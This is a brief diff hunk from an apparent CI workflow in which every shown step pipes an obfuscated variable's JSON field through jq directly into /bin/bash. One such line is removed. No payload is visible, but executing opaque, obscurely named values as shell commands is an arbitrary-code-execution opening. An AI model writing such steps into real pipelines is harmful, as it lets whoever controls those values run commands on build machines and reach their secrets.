@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$nz3" | jq -r .c6 | /bin/bash
           printf '%s' "$ss154" | jq -r .ft498 | /bin/bash
           echo $fybd32 | jq -r .cez178 | /bin/bash
-          echo $qlnk0133 | jq -r .zeh68 | /bin/bash
           echo $z21391 | jq -r .xfdb9893 | /bin/bash
           printf '%s' "$p6" | jq -r .xgfo8253 | /bin/bash
           echo $uoskj97886 | jq -r .r8 | /bin/bash
